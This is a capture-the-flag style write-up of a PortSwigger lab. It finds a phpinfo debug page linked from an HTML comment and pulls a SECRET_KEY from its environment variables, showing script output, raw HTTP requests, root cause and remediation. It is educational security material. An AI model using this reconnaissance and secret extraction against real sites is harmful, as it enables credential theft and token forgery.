# PortSwigger Lab: Information disclosure on debug page

# TAGS: Information Disclosure, Debug Page, HTML Comments, Burp Suite

Category: Information Disclosure
Date: October 29, 2026
Day: Thursday
Link: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page
Published: Ready
Status: Done

---

## Intro

This is the second lab in the **Information Disclosure** series. Here the leak comes from a **debug page left in production**: `/cgi-bin/phpinfo.php` is publicly reachable and dumps the PHP configuration, including environment variables such as `SECRET_KEY`. The page isn't linked anywhere visible — it's hidden in an **HTML comment** on the home page.

The official solution uses Burp Suite Professional's **Find comments** engagement tool to locate the link. Since that isn't available in Burp Community, I wrote a small free script that does the same job.

This write-up covers the reconnaissance, the exploitation steps, the root cause, the real-world impact, and how to prevent it.

---

## Reconnaissance:

#### Lab Description Lookup:

The lab description says it contains a debug page that discloses sensitive information about the application. The goal is to obtain and submit the `SECRET_KEY` environment variable.

I opened the home page and looked at the HTML source. Buried in it was a comment with a link:

```html
<!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->
```

That is the hidden entry point.

---

## Exploitation:

#### Step 1: Find the hidden debug link

The official solution finds this comment with Burp Pro's **Target → Site Map → Engagement tools → Find comments**. Burp Community doesn't include that tool, so I wrote `scripts/find_debug_secret.py`, which:

1. fetches the home page and extracts all **HTML comments**;
2. collects any `href` found inside those comments;
3. tries a few common debug paths as a fallback;
4. downloads the candidate page and extracts `SECRET_KEY`.

```bash
python3 find_debug_secret.py 0aeb004504821a3b800494cb00da00f2.web-security-academy.net
```

```text
[*] found 5 HTML comment(s)
    <!-- <a href=/cgi-bin/phpinfo.php>Debug</a> -->

[*] checking 6 candidate path(s)

[200] /cgi-bin/phpinfo.php

[+] SECRET_KEY: vyicq46xzo7jl6qcflt0j78r60j8sucr
```

#### Step 2: Read the debug page

The page itself is a standard `phpinfo()` output:

```http
GET /cgi-bin/phpinfo.php HTTP/2
Host: 0aeb004504821a3b800494cb00da00f2.web-security-academy.net
```

```http
HTTP/2 200 OK
Content-Type: text/html; charset=UTF-8
```

Among the environment variables, the page shows:

```text
SECRET_KEY    vyicq46xzo7jl6qcflt0j78r60j8sucr
```

#### Step 3: Submit the secret

I clicked **Submit solution** and sent the value to `/submitSolution`:

```http
POST /submitSolution HTTP/2
Host: 0aeb004504821a3b800494cb00da00f2.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

answer=vyicq46xzo7jl6qcflt0j78r60j8sucr
```

```json
{"correct":true}
```

The lab showed **"Congratulations, you solved the lab!"**.

---

## Root Cause

A debug page (`phpinfo()`) was left enabled and publicly reachable in production. The page exposes the full PHP configuration, server paths and **environment variables — including `SECRET_KEY`**, which is used by the application to sign or encrypt data.

The only "protection" was that the link to the page was hidden in an HTML comment on the home page. That is not access control: anyone reading the source (or using a comment finder) can discover and request the page directly.

---

## Impact

Leaking `SECRET_KEY` can allow an attacker to **forge signed data, cookies or tokens**, bypassing authentication or integrity checks. The debug page also reveals paths, versions and configuration that help plan further attacks. In real applications, an exposed `phpinfo()` is a well-known high-value finding for exactly this reason.

---

## Remediation

To prevent this issue, applications should:

- **Remove debug pages** (`phpinfo()`, debug consoles, profilers) from production;
- Disable debug/verbose modes and bind debug tooling to localhost or an internal network;
- Never put links to internal or sensitive endpoints in HTML comments — strip comments from production output;
- Keep secrets out of environment variables exposed by the web process, or use a dedicated secrets manager;
- Restrict access to administrative/debug paths with authentication and network controls.

---

## Key Takeaways

1. HTML comments can hide links to sensitive endpoints — always read the source.
2. `phpinfo()` is a goldmine: environment variables, secrets, paths and configuration.
3. A debug page reachable without authentication is a critical leak.
4. A small script can fully replace a paid "Find comments" tool.

---

## References

- [PortSwigger — Information disclosure](https://portswigger.net/web-security/information-disclosure)
- [PortSwigger — Information disclosure on debug page (lab)](https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-on-debug-page)
- [OWASP — Improper Error Handling](https://owasp.org/www-community/Improper_Error_Handling)

---

## Disclaimer

This write-up was created for educational purposes only. All testing was performed in an authorized PortSwigger Web Security Academy laboratory environment. Never test systems without explicit authorization.

This article was written with the assistance of artificial intelligence tools for text review, structure, and grammar correction. However, the entire testing process, technical analysis, vulnerability exploitation, and conclusions presented are the sole responsibility of the author and are based on tests performed in a controlled environment provided by the PortSwigger Web Security Academy.
